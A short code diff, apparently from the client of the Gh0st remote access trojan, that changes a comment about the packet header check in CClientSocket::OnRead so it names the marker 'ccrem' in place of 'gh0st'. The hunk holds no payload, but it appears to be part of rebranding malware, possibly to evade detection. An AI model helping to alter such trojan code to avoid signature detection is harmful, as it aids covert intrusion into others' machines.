@@ -319,7 +319,7 @@ void CClientSocket::OnRead(LPBYTE lpBuffer, DWORD dwIoSize)
 		{
 			BYTE bPacketFlag[FLAG_SIZE];
 			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
-			//---判断数据头 就是  构造函数的 g h 0 s t  主控端也讲过的
+			//---判断数据头 就是  构造函数的 ccrem  主控端有的
 			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
 				throw "bad buffer";
 
